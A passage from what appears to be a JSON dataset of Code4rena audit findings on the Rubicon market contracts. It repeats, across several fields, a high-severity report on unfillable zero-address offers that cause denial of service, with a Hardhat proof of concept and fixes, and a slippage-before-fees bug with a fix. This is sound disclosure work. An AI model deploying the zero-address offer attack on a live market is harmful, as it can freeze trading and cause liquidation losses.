parseUnits(\"14\")\n\n                // amount that should be received with fee deducted (only Protocol fee!)\n                const quantityAfterFee = await rubiconMarket.calcAmountAfterFee(\n                    quantity\n                )\n\n                // buying TEST with USDCT\n                await rubiconMarket.buy(2, quantity)\n                // saving new balance state\n                const balanceAfter = await testCoin.balanceOf(owner.address)\n\n                // validating that owner received proper amount with ONLY protocol fee charged\n                expect(balanceAfter.sub(balanceBefore)).to.be.equal(\n                    quantityAfterFee\n                )\n            })\n```\nThis shows unfillable orders can be created. If this order exists at the top, it will revert calls from the Position.sol contract.\n\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nThis requires multiple mitigation steps:\n1. Do not allow 0 address as owner. This can be enforced with a `require` statement in the `offer()` function in `SimpleMarket` contract.\n2. Unfillable orders can still be created by setting recipient to blacklisted addresses, for tokens like USDT. To navigate this, in the while loop in `buyAllAmount`, include error handling with try-catch blocks to use he next offer is the current offer is unfillable.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1079\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1039\n\n\n# Vulnerability details\n\n## Impact\nThe Rubicon market has two functions that are interesting: `buyAllAmount` and `sellAllAmount`. These functions are responsible for using up offers until the entire amount is bought or sold. The contract stores offers in a sorted linked list, each with its unique id, and sorted according to the price. This ensures that the head of the linked list has the best price, or the best offer for either sell or buy. This head is referenced in the code by the mapping `_best[address][address]` and further worse offers can be navigated to by calling best.next, similar to a linked list navigation.\n\nWhen `buyAllAmount` is called, a while loop is run, and the best offer is taken out in each iteration using the function `getBestOffer()` similar to the snippet below.\n```solidity\nwhile (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n```\nThe offers are then filled one after the other. However, if an offer is unfillable, or reverts, then the whole transaction reverts. This breaks the functionality of the `buyAllAmount` function and creates a DOS attack vector.\n\nThe standard openzeppelin implementation of the ERC20 token does not support transfers to the zero address. If a transaction tries to send tokens to 0 address, it reverts with 'ERC20: transfer to the zero address'. Thus if an offer is created where the receiver of the payment is zero address, that offer can be unfillable. If this offer is created such that it is the best possible price, then this offer will exist at the head of the linked list in the `_best` variable and thus will be the first offer looked into. Since this offer is unfillable, the entire transaction will revert.\n\nWhen creating an offer, the user can specify two addresses, the owner address and the recipient address. The contract does not sanitize these addresses and even accepts 0 address in these fields. These are also the addresses where the payment token is sent when the order is filled.\n\nThus, a malicious user can create a buy/sell order of a small volume but at a very good price. They can set both the owner and the recipient to 0 when calling `offer()`. This will create a lucrative unfillable order which will always be called on first. This will lead to all transactions reverting due to this single unfillable offer.\n\nThe impact is even more pronounced for the `Position.sol` contract. Unlike normal users, this contract does not have the ability to select offers by id, and is only filled using `buyAllAmount` or `sellAllAmount`. A DOS attack as described above will break the functionality of the two mentioned functions, and thus break the whole Position contract as a result. This can lead to large losses where users are unable to unwind positions before liquidations.\n\nThis also has a secondary impact of blocking the creation of future orders. As can be seen [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1273-L1341), in the `_matcho` function, when new offers are created, they are first matched with existing offers in the same range, and if there is still a balance remaining, a new offer is created. Now if the existing offers are such unfillable orders, it would also block the creation of further new orders, causing another functionality DOS.\n\n## Proof of Concept\nThe POC shows that if the recipient and owner addresses are both set to 0, the order cannot be filed. This order will exist in the linked list sorted by price and thus will be the first order to be filled.\n\nFirst, change the code in `deployRubiconProtocolFixture()` where the orders are created [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/ProtocolDeployment.ts#L165-L171) to the following order:\n```javascript\nawait rubiconMarket.functions[\n            \"offer(uint256,address,uint256,address,address,address)\"\n        ](\n            parseUnits(\"100\"),\n            testCoin.address,\n            parseUnits(\"110\", 6),\n            testStableCoin.address,\n            ethers.constants.AddressZero,\n            ethers.constants.AddressZero,\n            { from: owner.address }\n        )\n```\n\nThis creates an unfillable order. Now try running the provided test in \"can take an offer with 0 makerFee\" by using the command `hardhat test --grep \"0 makerFee\"`.\n\nThis test fails with 'ERC20: transfer to the zero address' error, since the order is unfillable. The test body is also copied here as reference.\n```javascript\nit(\"can take an offer with 0 makerFee\", async function () {\n                const { rubiconMarket, testCoin, owner } = await loadFixture(\n                    deployRubiconProtocolFixture\n                )\n                const balanceBefore = await testCoin.balanceOf(owner.address)\n                // in TEST\n                const quantity = parseUnits(\"14\")\n\n                // amount that should be received with fee deducted (only Protocol fee!)\n                const quantityAfterFee = await rubiconMarket.calcAmountAfterFee(\n                    quantity\n                )\n\n                // buying TEST with USDCT\n                await rubiconMarket.buy(2, quantity)\n                // saving new balance state\n                const balanceAfter = await testCoin.balanceOf(owner.address)\n\n                // validating that owner received proper amount with ONLY protocol fee charged\n                expect(balanceAfter.sub(balanceBefore)).to.be.equal(\n                    quantityAfterFee\n                )\n            })\n```\nThis shows unfillable orders can be created. If this order exists at the top, it will revert calls from the Position.sol contract.\n\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nThis requires multiple mitigation steps:\n1. Do not allow 0 address as owner. This can be enforced with a `require` statement in the `offer()` function in `SimpleMarket` contract.\n2. Unfillable orders can still be created by setting recipient to blacklisted addresses, for tokens like USDT. To navigate this, in the while loop in `buyAllAmount`, include error handling with try-catch blocks to use he next offer is the current offer is unfillable.",
      "description": null,
      "impact": "## Impact\nThe Rubicon market has two functions that are interesting: `buyAllAmount` and `sellAllAmount`. These functions are responsible for using up offers until the entire amount is bought or sold. The contract stores offers in a sorted linked list, each with its unique id, and sorted according to the price. This ensures that the head of the linked list has the best price, or the best offer for either sell or buy. This head is referenced in the code by the mapping `_best[address][address]` and further worse offers can be navigated to by calling best.next, similar to a linked list navigation.\n\nWhen `buyAllAmount` is called, a while loop is run, and the best offer is taken out in each iteration using the function `getBestOffer()` similar to the snippet below.\n```solidity\nwhile (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n```\nThe offers are then filled one after the other. However, if an offer is unfillable, or reverts, then the whole transaction reverts. This breaks the functionality of the `buyAllAmount` function and creates a DOS attack vector.\n\nThe standard openzeppelin implementation of the ERC20 token does not support transfers to the zero address. If a transaction tries to send tokens to 0 address, it reverts with 'ERC20: transfer to the zero address'. Thus if an offer is created where the receiver of the payment is zero address, that offer can be unfillable. If this offer is created such that it is the best possible price, then this offer will exist at the head of the linked list in the `_best` variable and thus will be the first offer looked into. Since this offer is unfillable, the entire transaction will revert.\n\nWhen creating an offer, the user can specify two addresses, the owner address and the recipient address. The contract does not sanitize these addresses and even accepts 0 address in these fields. These are also the addresses where the payment token is sent when the order is filled.\n\nThus, a malicious user can create a buy/sell order of a small volume but at a very good price. They can set both the owner and the recipient to 0 when calling `offer()`. This will create a lucrative unfillable order which will always be called on first. This will lead to all transactions reverting due to this single unfillable offer.\n\nThe impact is even more pronounced for the `Position.sol` contract. Unlike normal users, this contract does not have the ability to select offers by id, and is only filled using `buyAllAmount` or `sellAllAmount`. A DOS attack as described above will break the functionality of the two mentioned functions, and thus break the whole Position contract as a result. This can lead to large losses where users are unable to unwind positions before liquidations.\n\nThis also has a secondary impact of blocking the creation of future orders. As can be seen [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1273-L1341), in the `_matcho` function, when new offers are created, they are first matched with existing offers in the same range, and if there is still a balance remaining, a new offer is created. Now if the existing offers are such unfillable orders, it would also block the creation of further new orders, causing another functionality DOS.\n",
      "mitigation": "## Recommended Mitigation Steps\nThis requires multiple mitigation steps:\n1. Do not allow 0 address as owner. This can be enforced with a `require` statement in the `offer()` function in `SimpleMarket` contract.\n2. Unfillable orders can still be created by setting recipient to blacklisted addresses, for tokens like USDT. To navigate this, in the while loop in `buyAllAmount`, include error handling with try-catch blocks to use he next offer is the current offer is unfillable.\n",
      "poc": "## Proof of Concept\nThe POC shows that if the recipient and owner addresses are both set to 0, the order cannot be filed. This order will exist in the linked list sorted by price and thus will be the first order to be filled.\n\nFirst, change the code in `deployRubiconProtocolFixture()` where the orders are created [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/ProtocolDeployment.ts#L165-L171) to the following order:\n```javascript\nawait rubiconMarket.functions[\n            \"offer(uint256,address,uint256,address,address,address)\"\n        ](\n            parseUnits(\"100\"),\n            testCoin.address,\n            parseUnits(\"110\", 6),\n            testStableCoin.address,\n            ethers.constants.AddressZero,\n            ethers.constants.AddressZero,\n            { from: owner.address }\n        )\n```\n\nThis creates an unfillable order. Now try running the provided test in \"can take an offer with 0 makerFee\" by using the command `hardhat test --grep \"0 makerFee\"`.\n\nThis test fails with 'ERC20: transfer to the zero address' error, since the order is unfillable. The test body is also copied here as reference.\n```javascript\nit(\"can take an offer with 0 makerFee\", async function () {\n                const { rubiconMarket, testCoin, owner } = await loadFixture(\n                    deployRubiconProtocolFixture\n                )\n                const balanceBefore = await testCoin.balanceOf(owner.address)\n                // in TEST\n                const quantity = parseUnits(\"14\")\n\n                // amount that should be received with fee deducted (only Protocol fee!)\n                const quantityAfterFee = await rubiconMarket.calcAmountAfterFee(\n                    quantity\n                )\n\n                // buying TEST with USDCT\n                await rubiconMarket.buy(2, quantity)\n                // saving new balance state\n                const balanceAfter = await testCoin.balanceOf(owner.address)\n\n                // validating that owner received proper amount with ONLY protocol fee charged\n                expect(balanceAfter.sub(balanceBefore)).to.be.equal(\n                    quantityAfterFee\n                )\n            })\n```\nThis shows unfillable orders can be created. If this order exists at the top, it will revert calls from the Position.sol contract.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1079\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1039\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nHardhat\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nThe Rubicon market has two functions that are interesting: `buyAllAmount` and `sellAllAmount`. These functions are responsible for using up offers until the entire amount is bought or sold. The contract stores offers in a sorted linked list, each with its unique id, and sorted according to the price. This ensures that the head of the linked list has the best price, or the best offer for either sell or buy. This head is referenced in the code by the mapping `_best[address][address]` and further worse offers can be navigated to by calling best.next, similar to a linked list navigation.\n\nWhen `buyAllAmount` is called, a while loop is run, and the best offer is taken out in each iteration using the function `getBestOffer()` similar to the snippet below.\n```solidity\nwhile (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n```\nThe offers are then filled one after the other. However, if an offer is unfillable, or reverts, then the whole transaction reverts. This breaks the functionality of the `buyAllAmount` function and creates a DOS attack vector.\n\nThe standard openzeppelin implementation of the ERC20 token does not support transfers to the zero address. If a transaction tries to send tokens to 0 address, it reverts with 'ERC20: transfer to the zero address'. Thus if an offer is created where the receiver of the payment is zero address, that offer can be unfillable. If this offer is created such that it is the best possible price, then this offer will exist at the head of the linked list in the `_best` variable and thus will be the first offer looked into. Since this offer is unfillable, the entire transaction will revert.\n\nWhen creating an offer, the user can specify two addresses, the owner address and the recipient address. The contract does not sanitize these addresses and even accepts 0 address in these fields. These are also the addresses where the payment token is sent when the order is filled.\n\nThus, a malicious user can create a buy/sell order of a small volume but at a very good price. They can set both the owner and the recipient to 0 when calling `offer()`. This will create a lucrative unfillable order which will always be called on first. This will lead to all transactions reverting due to this single unfillable offer.\n\nThe impact is even more pronounced for the `Position.sol` contract. Unlike normal users, this contract does not have the ability to select offers by id, and is only filled using `buyAllAmount` or `sellAllAmount`. A DOS attack as described above will break the functionality of the two mentioned functions, and thus break the whole Position contract as a result. This can lead to large losses where users are unable to unwind positions before liquidations.\n\nThis also has a secondary impact of blocking the creation of future orders. As can be seen [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1273-L1341), in the `_matcho` function, when new offers are created, they are first matched with existing offers in the same range, and if there is still a balance remaining, a new offer is created. Now if the existing offers are such unfillable orders, it would also block the creation of further new orders, causing another functionality DOS.\n",
        "recommendation": "## Recommended Mitigation Steps\nThis requires multiple mitigation steps:\n1. Do not allow 0 address as owner. This can be enforced with a `require` statement in the `offer()` function in `SimpleMarket` contract.\n2. Unfillable orders can still be created by setting recipient to blacklisted addresses, for tokens like USDT. To navigate this, in the while loop in `buyAllAmount`, include error handling with try-catch blocks to use he next offer is the current offer is unfillable.\n",
        "poc": "## Proof of Concept\nThe POC shows that if the recipient and owner addresses are both set to 0, the order cannot be filed. This order will exist in the linked list sorted by price and thus will be the first order to be filled.\n\nFirst, change the code in `deployRubiconProtocolFixture()` where the orders are created [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/ProtocolDeployment.ts#L165-L171) to the following order:\n```javascript\nawait rubiconMarket.functions[\n            \"offer(uint256,address,uint256,address,address,address)\"\n        ](\n            parseUnits(\"100\"),\n            testCoin.address,\n            parseUnits(\"110\", 6),\n            testStableCoin.address,\n            ethers.constants.AddressZero,\n            ethers.constants.AddressZero,\n            { from: owner.address }\n        )\n```\n\nThis creates an unfillable order. Now try running the provided test in \"can take an offer with 0 makerFee\" by using the command `hardhat test --grep \"0 makerFee\"`.\n\nThis test fails with 'ERC20: transfer to the zero address' error, since the order is unfillable. The test body is also copied here as reference.\n```javascript\nit(\"can take an offer with 0 makerFee\", async function () {\n                const { rubiconMarket, testCoin, owner } = await loadFixture(\n                    deployRubiconProtocolFixture\n                )\n                const balanceBefore = await testCoin.balanceOf(owner.address)\n                // in TEST\n                const quantity = parseUnits(\"14\")\n\n                // amount that should be received with fee deducted (only Protocol fee!)\n                const quantityAfterFee = await rubiconMarket.calcAmountAfterFee(\n                    quantity\n                )\n\n                // buying TEST with USDCT\n                await rubiconMarket.buy(2, quantity)\n                // saving new balance state\n                const balanceAfter = await testCoin.balanceOf(owner.address)\n\n                // validating that owner received proper amount with ONLY protocol fee charged\n                expect(balanceAfter.sub(balanceBefore)).to.be.equal(\n                    quantityAfterFee\n                )\n            })\n```\nThis shows unfillable orders can be created. If this order exists at the top, it will revert calls from the Position.sol contract.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1079\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1039\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nHardhat\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1079\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1039\n\n\n# Vulnerability details\n\n## Impact\nThe Rubicon market has two functions that are interesting: `buyAllAmount` and `sellAllAmount`. These functions are responsible for using up offers until the entire amount is bought or sold. The contract stores offers in a sorted linked list, each with its unique id, and sorted according to the price. This ensures that the head of the linked list has the best price, or the best offer for either sell or buy. This head is referenced in the code by the mapping `_best[address][address]` and further worse offers can be navigated to by calling best.next, similar to a linked list navigation.\n\nWhen `buyAllAmount` is called, a while loop is run, and the best offer is taken out in each iteration using the function `getBestOffer()` similar to the snippet below.\n```solidity\nwhile (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n```\nThe offers are then filled one after the other. However, if an offer is unfillable, or reverts, then the whole transaction reverts. This breaks the functionality of the `buyAllAmount` function and creates a DOS attack vector.\n\nThe standard openzeppelin implementation of the ERC20 token does not support transfers to the zero address. If a transaction tries to send tokens to 0 address, it reverts with 'ERC20: transfer to the zero address'. Thus if an offer is created where the receiver of the payment is zero address, that offer can be unfillable. If this offer is created such that it is the best possible price, then this offer will exist at the head of the linked list in the `_best` variable and thus will be the first offer looked into. Since this offer is unfillable, the entire transaction will revert.\n\nWhen creating an offer, the user can specify two addresses, the owner address and the recipient address. The contract does not sanitize these addresses and even accepts 0 address in these fields. These are also the addresses where the payment token is sent when the order is filled.\n\nThus, a malicious user can create a buy/sell order of a small volume but at a very good price. They can set both the owner and the recipient to 0 when calling `offer()`. This will create a lucrative unfillable order which will always be called on first. This will lead to all transactions reverting due to this single unfillable offer.\n\nThe impact is even more pronounced for the `Position.sol` contract. Unlike normal users, this contract does not have the ability to select offers by id, and is only filled using `buyAllAmount` or `sellAllAmount`. A DOS attack as described above will break the functionality of the two mentioned functions, and thus break the whole Position contract as a result. This can lead to large losses where users are unable to unwind positions before liquidations.\n\nThis also has a secondary impact of blocking the creation of future orders. As can be seen [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1273-L1341), in the `_matcho` function, when new offers are created, they are first matched with existing offers in the same range, and if there is still a balance remaining, a new offer is created. Now if the existing offers are such unfillable orders, it would also block the creation of further new orders, causing another functionality DOS.\n\n## Proof of Concept\nThe POC shows that if the recipient and owner addresses are both set to 0, the order cannot be filed. This order will exist in the linked list sorted by price and thus will be the first order to be filled.\n\nFirst, change the code in `deployRubiconProtocolFixture()` where the orders are created [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/ProtocolDeployment.ts#L165-L171) to the following order:\n```javascript\nawait rubiconMarket.functions[\n            \"offer(uint256,address,uint256,address,address,address)\"\n        ](\n            parseUnits(\"100\"),\n            testCoin.address,\n            parseUnits(\"110\", 6),\n            testStableCoin.address,\n            ethers.constants.AddressZero,\n            ethers.constants.AddressZero,\n            { from: owner.address }\n        )\n```\n\nThis creates an unfillable order. Now try running the provided test in \"can take an offer with 0 makerFee\" by using the command `hardhat test --grep \"0 makerFee\"`.\n\nThis test fails with 'ERC20: transfer to the zero address' error, since the order is unfillable. The test body is also copied here as reference.\n```javascript\nit(\"can take an offer with 0 makerFee\", async function () {\n                const { rubiconMarket, testCoin, owner } = await loadFixture(\n                    deployRubiconProtocolFixture\n                )\n                const balanceBefore = await testCoin.balanceOf(owner.address)\n                // in TEST\n                const quantity = parseUnits(\"14\")\n\n                // amount that should be received with fee deducted (only Protocol fee!)\n                const quantityAfterFee = await rubiconMarket.calcAmountAfterFee(\n                    quantity\n                )\n\n                // buying TEST with USDCT\n                await rubiconMarket.buy(2, quantity)\n                // saving new balance state\n                const balanceAfter = await testCoin.balanceOf(owner.address)\n\n                // validating that owner received proper amount with ONLY protocol fee charged\n                expect(balanceAfter.sub(balanceBefore)).to.be.equal(\n                    quantityAfterFee\n                )\n            })\n```\nThis shows unfillable orders can be created. If this order exists at the top, it will revert calls from the Position.sol contract.\n\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nThis requires multiple mitigation steps:\n1. Do not allow 0 address as owner. This can be enforced with a `require` statement in the `offer()` function in `SimpleMarket` contract.\n2. Unfillable orders can still be created by setting recipient to blacklisted addresses, for tokens like USDT. To navigate this, in the while loop in `buyAllAmount`, include error handling with try-catch blocks to use he next offer is the current offer is unfillable.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 666,
      "page_start": null,
      "heading": "666. RubiconMarket checks slippage incorrectly",
      "heading_cleaned": "RubiconMarket checks slippage incorrectly",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1112\n\n\n# Vulnerability details\n\n## Impact\nRubiconMarket checks slippage incorrectly, user can loose funds because of that.\n\n## Proof of Concept\nRubiconMarket.sellAllAmount function have price protection. User should provide `min_fill_amount` param to that function in order to limit minimum amount he would like to receive.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\nWhen order is filling in this function, full [offer amount is added](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1051) to `fill_amt` param.\n`fill_amt` is the filled amount without fees. Fees [will be decreased](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1066) in the end of function.\nBut slippage [is checked before](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1065) fees are removed.\n\nThis is incorrect, as user will provide `min_fill_amount` that he wants to receive after all fees.\n\nThe same problem exists for RubiconMarket.buyAllAmount.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nFirst calculate amount without fees, then check slippage.\n```solidity\nfill_amt = calcAmountAfterFee(fill_amt);\nrequire(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n```\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1112\n\n\n# Vulnerability details\n\n## Impact\nRubiconMarket checks slippage incorrectly, user can loose funds because of that.\n\n## Proof of Concept\nRubiconMarket.sellAllAmount function have price protection. User should provide `min_fill_amount` param to that function in order to limit minimum amount he would like to receive.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\nWhen order is filling in this function, full [offer amount is added](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1051) to `fill_amt` param.\n`fill_amt` is the filled amount without fees. Fees [will be decreased](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1066) in the end of function.\nBut slippage [is checked before](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1065) fees are removed.\n\nThis is incorrect, as user will provide `min_fill_amount` that he wants to receive after all fees.\n\nThe same problem exists for RubiconMarket.buyAllAmount.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nFirst calculate amount without fees, then check slippage.\n```solidity\nfill_amt = calcAmountAfterFee(fill_amt);\nrequire(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n```",
      "description": null,
      "impact": "## Impact\nRubiconMarket checks slippage incorrectly, user can loose funds because of that.\n",
      "mitigation": "## Recommended Mitigation Steps\nFirst calculate amount without fees, then check slippage.\n```solidity\nfill_amt = calcAmountAfterFee(fill_amt);\nrequire(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n```\n",
      "poc": "## Proof of Concept\nRubiconMarket.sellAllAmount function have price protection. User should provide `min_fill_amount` param to that function in order to limit minimum amount he would like to receive.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\nWhen order is filling in this function, full [offer amount is added](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1051) to `fill_amt` param.\n`fill_amt` is the filled amount without fees. Fees [will be decreased](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1066) in the end of function.\nBut slippage [is checked before](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1065) fees are removed.\n\nThis is incorrect, as user will provide `min_fill_amount` that he wants to receive after all fees.\n\nThe same problem exists for RubiconMarket.buyAllAmount.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1112\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVsCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nRubiconMarket checks slippage incorrectly, user can loose funds because of that.\n",
        "recommendation": "## Recommended Mitigation Steps\nFirst calculate amount without fees, then check slippage.\n```solidity\nfill_amt = calcAmountAfterFee(fill_amt);\nrequire(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n```\n",
